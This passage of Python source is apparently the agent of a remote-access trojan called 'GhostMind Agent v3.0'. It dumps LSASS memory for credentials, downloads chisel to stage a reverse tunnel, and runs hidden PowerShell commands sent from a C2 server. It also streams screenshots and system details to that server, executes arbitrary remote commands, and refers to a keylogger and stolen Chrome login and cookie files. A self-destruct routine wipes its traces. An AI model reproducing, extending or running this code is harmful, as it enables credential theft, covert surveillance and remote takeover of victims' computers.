            "using System; using System.Runtime.InteropServices;\n"
            "public class MiniDump {\n"
            "  [DllImport(\"dbghelp.dll\")] public static extern bool MiniDumpWriteDump("
            "IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);\n"
            "}\n"
            "'@; "
            "$handle=[System.IO.File]::Open(\"$r\\lsass.dmp\",[System.IO.FileMode]::Create); "
            "[MiniDump]::MiniDumpWriteDump($proc.Handle,$proc.Id,$handle.SafeFileHandle,2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)|Out-Null; "
            "$handle.Close()}"
        ),
        "network_pivot": (
            # Download chisel for reverse tunnel
            "$d=(Get-Volume|Where{$_.FileSystemLabel-eq'GHOST_DRIVE'}).DriveLetter; "
            "if(!$d){$t=$env:TEMP}else{$t=$d+':'}; "
            "$chisel=\"$t\\chisel.exe\"; "
            "if(!(Test-Path $chisel)){"
            "Invoke-WebRequest -Uri 'https://github.com/jpillora/chisel/releases/latest/download/chisel_windows_amd64.gz' "
            "-OutFile \"$t\\chisel.gz\" -UseBasicParsing}; "
            "# Note: Start chisel in server mode — configure C2_IP manually\n"
            "Write-Output 'Network pivot tools staged.'"
        )
    }
    
    script = scripts.get(mission_name.lower())
    if script:
        subprocess.Popen(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        print_log(f"Mission '{mission_name}' started.")
        sio.emit("mission_status", f"Mission {mission_name} started. Results -> GHOST_DRIVE\\sys_report\\")
    elif mission_name.lower() == "win_password":
        # Teknik khas — jalankan dalam thread supaya tak block agent
        threading.Thread(target=run_win_password_mission, daemon=True).start()
    else:
        print_log(f"Unknown mission: {mission_name}")

@sio.event
def execute_json_command(data):
    print_log(f"JSON Command: {data}")
    try:
        action = data.get("action")
        if not action:
            return

        # PinchTab CDP actions
        if action.startswith("pinchtab_"):
            if not ws_cdp:
                print_log("Chrome CDP not started yet. Starting lazily now...")
                start_cdp_chrome()
                
            if PINCHTAB_ACTIVE:
                pt_action = action.replace("pinchtab_", "")
                if pt_action == "get_dom":
                    dom = get_page_dom_context()
                    sio.emit("dom_context", {"dom": dom})
                elif pt_action == "js":
                    code = data.get("code", "")
                    try:
                        requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/evaluate",
                                      json={"expression": code}, timeout=5)
                    except Exception:
                        send_cdp_command("Runtime.evaluate", {"expression": code})
                else:
                    requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/{pt_action}",
                                  json=data, timeout=5)
            else:
                # CDP fallback
                pt_action = action.replace("pinchtab_", "")
                if pt_action == "navigate":
                    if ws_cdp:
                        send_cdp_command("Page.navigate", {"url": data.get("url")})
                    else:
                        url = data.get("url")
                        print_log(f"CDP offline. Opening URL as new tab in existing browser: {url}")
                        subprocess.Popen(f'start chrome "{url}"', shell=True)
                elif pt_action == "click" and ws_cdp:
                    send_cdp_command("Runtime.evaluate", {"expression": f"document.querySelector('{data.get('selector')}').click();"})
                elif pt_action == "type" and ws_cdp:
                    send_cdp_command("Runtime.evaluate", {"expression": f"document.querySelector('{data.get('selector')}').value='{data.get('text')}';"})
                elif pt_action == "js" and ws_cdp:
                    send_cdp_command("Runtime.evaluate", {"expression": data.get("code", "")})
                elif pt_action == "get_dom":
                    dom = get_page_dom_context()
                    sio.emit("dom_context", {"dom": dom})
            return

        x_raw = data.get("x")
        y_raw = data.get("y")
        text  = data.get("text")
        key   = data.get("key")

        # Skala koordinat dari grid standard 1280x720 kepada saiz skrin sebenar target
        screen_w, screen_h = pyautogui.size()
        scale_x = screen_w / 1280.0
        scale_y = screen_h / 720.0

        x = int(float(x_raw) * scale_x) if x_raw is not None else None
        y = int(float(y_raw) * scale_y) if y_raw is not None else None

        if action == "click" and x is not None and y is not None:
            pyautogui.click(x=x, y=y)
        elif action == "right_click" and x is not None and y is not None:
            pyautogui.rightClick(x=x, y=y)
        elif action == "double_click" and x is not None and y is not None:
            pyautogui.doubleClick(x=x, y=y)
        elif action == "move" and x is not None and y is not None:
            pyautogui.moveTo(x, y)
        elif action == "scroll":
            sx = int(float(data.get("x", 960)) * scale_x)
            sy = int(float(data.get("y", 540)) * scale_y)
            direction = data.get("direction", "down")
            amount = int(data.get("amount", 3))
            pyautogui.scroll(-amount if direction == "down" else amount, x=sx, y=sy)
        elif action == "type" and text:
            pyautogui.typewrite(str(text), interval=0.04)
        elif action == "press" and key:
            pyautogui.press(key)
        elif action == "hotkey":
            keys = data.get("keys", [])
            if keys:
                pyautogui.hotkey(*keys)
        elif action == "run":
            cmd = data.get("command")
            if cmd:
                subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif action == "plan":
            # Multi-step plan — log for now, execute first step
            steps = data.get("steps", [])
            print_log(f"Plan received: {data.get('mission')} — {len(steps)} steps")
        elif action == "nothing":
            print_log("AI: Nothing to do this cycle.")
        else:
            print_log(f"Unknown action: {action}")

    except Exception as e:
        print_log(f"JSON command failed: {e}")

@sio.event
def disconnect():
    print_log("Disconnected from server.")

# ============================================================
# SCREENSHOT LOOP
# ============================================================
def check_internet():
    try:
        socket_lib.setdefaulttimeout(3)
        socket_lib.socket(socket_lib.AF_INET, socket_lib.SOCK_STREAM).connect(("8.8.8.8", 53))
        return True
    except Exception:
        return False

def wake_server():
    print_log("Waking C2 server...")
    for i in range(6):
        try:
            r = requests.get(f"{SERVER_URL}/api/status", timeout=15)
            if r.status_code == 200:
                print_log("C2 Server awake!")
                return True
        except Exception:
            pass
        print_log(f"Wake attempt {i+1}/6...")
        time.sleep(8)
    return False

def build_system_context():
    """Bina system context untuk hantar ke AI setiap call."""
    try:
        return {
            "computer": os.environ.get("COMPUTERNAME", "unknown"),
            "user": os.environ.get("USERNAME", "unknown"),
            "userprofile": os.environ.get("USERPROFILE", ""),
            "temp": os.environ.get("TEMP", ""),
            "pinchtab_active": PINCHTAB_ACTIVE,
        }
    except Exception:
        return {}

def send_screenshots():
    global running
    while running:
        try:
            if not sio.connected:
                if check_internet():
                    try:
                        sio.connect(SERVER_URL, wait_timeout=15)
                    except Exception as e:
                        print_log(f"Reconnect failed: {e}")

            if sio.connected:
                try:
                    screenshot = ImageGrab.grab()
                    buffer = io.BytesIO()
                    screenshot = screenshot.resize((1280, 720))
                    screenshot.save(buffer, format="JPEG", quality=60)
                    img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
                    sio.emit("screenshot_data", {
                        "image": img_str,
                        "system_context": build_system_context()
                    })
                except Exception as e:
                    print_log(f"Screenshot error: {e}")
            else:
                if check_internet():
                    try:
                        screenshot = ImageGrab.grab()
                        buffer = io.BytesIO()
                        screenshot = screenshot.resize((1280, 720))
                        screenshot.save(buffer, format="JPEG", quality=40)
                        img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
                        requests.post(f"{SERVER_URL}/api/hybrid_upload",
                                      json={"screenshot": img_str, "system_context": build_system_context()},
                                      timeout=10)
                        resp = requests.get(f"{SERVER_URL}/api/hybrid_command", timeout=5)
                        cmd_data = resp.json()
                        if cmd_data.get("command"):
                            cmd_str = cmd_data["command"]
                            if "{" in cmd_str and "}" in cmd_str:
                                execute_json_command(json.loads(cmd_str))
                            else:
                                execute_command(cmd_str)
                    except Exception as e:
                        print_log(f"HTTP fallback error: {e}")
        except Exception as e:
            print_log(f"Screenshot loop error: {e}")
        time.sleep(SCREENSHOT_INTERVAL)

def check_heartbeat_usb():
    try:
        output = subprocess.check_output(
            ["powershell", "-Command",
             "Get-PnpDevice -PresentOnly | Select-Object -ExpandProperty InstanceId | Select-String 'VID_303A|VID_2341'"],
            stderr=subprocess.DEVNULL, timeout=8
        ).decode("utf-8", errors="ignore")
        return "VID_303A" in output or "VID_2341" in output
    except Exception:
        return True  # Safe fallback

def self_destruct():
    global running
    print_log("Self-Destruct initiated...")
    running = False
    
    # Flush keylog
    with keylog_lock:
        _flush_keylog()
    
    try:
        if sio.connected:
            sio.emit("wipe_confirmed", {"pc_name": socket_lib.gethostname()})
            time.sleep(1)
        sio.disconnect()
    except Exception:
        pass
    
    try:
        # Padam fail-fail sementara
        for f in ["ghost_loot.zip", "chrome_login_Default.db", "chrome_cookies.db"]:
            fp = os.path.join(os.environ.get("TEMP", ""), f)
            if os.path.exists(fp):
                os.remove(fp)
        
        subprocess.run(["taskkill", "/F", "/IM", "pinchtab.exe"], capture_output=True)
        
        script_path = os.path.abspath(__file__)
        bat_path = os.path.join(os.environ.get("TEMP", ""), "wipe_ghost.bat")
        with open(bat_path, "w") as f:
            f.write(f"@echo off\ntimeout /t 2 /nobreak > NUL\ndel /f /q \"{script_path}\"\ndel /f /q \"%~f0\"\n")
        subprocess.Popen(bat_path, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print_log(f"Cleanup error: {e}")
    
    os._exit(0)

# ============================================================
# MAIN
# ============================================================
def main_loop():
    global running
    print_log("GhostMind Agent v3.0 started.")
    
    # Start keylogger segera
    start_keylogger()
    
    # Browser control di thread berasingan
    threading.Thread(target=initialize_browser_control, daemon=True).start()
    
    # Screenshot loop
    threading.Thread(target=send_screenshots, daemon=True).start()
    
    # Jalankan full harvest selepas 30 saat (bagi masa browser control bersedia)
    threading.Timer(30.0, run_full_harvest).start()
    
    while running:
        try:
            if current_mode == "B":
                if not check_heartbeat_usb():
                    print_log("ESP32 unplugged in Mode B. Self-destructing!")
                    self_destruct()
            
            if sio.connected:
                sio.emit("heartbeat")
            
            time.sleep(HEARTBEAT_INTERVAL)
            
        except KeyboardInterrupt:
            running = False
            break
        except Exception as e:
            print_log(f"Main loop error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    if check_internet():
        wake_server()
    else:
        print_log("No internet. Will retry in background.")
    
    for attempt in range(9999):
        try:
            print_log(f"Connecting to C2... attempt {attempt + 1}")
            sio.connect(SERVER_URL, wait_timeout=15)
            main_loop()
            break
        except Exception as e:
            print_log(f"Connection failed: {e}")
            wait = min(30, 5 + attempt * 2)
            time.sleep(wait)
